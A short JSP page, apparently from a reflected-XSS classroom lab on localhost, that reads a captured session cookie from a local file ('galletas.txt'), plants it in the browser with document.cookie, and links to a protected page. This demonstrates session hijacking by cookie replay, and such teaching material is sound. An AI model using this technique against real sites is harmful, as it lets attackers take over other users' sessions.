<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"
    import="java.util.*, java.io.*"%>
    
<%
Scanner sc = new Scanner(new File("c:/galletas.txt"));
String linea = sc.nextLine();
String sessionId = linea.split("=")[1];
%>    
    
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
</head>

<script>

document.cookie = "<%=linea%>; path=/";
alert(document.cookie);

</script>


<body>

<a href="http://localhost:8080/Ej08_XSS_Reflected/seguro/inicio.jsp">Dale</a>

</body>
</html>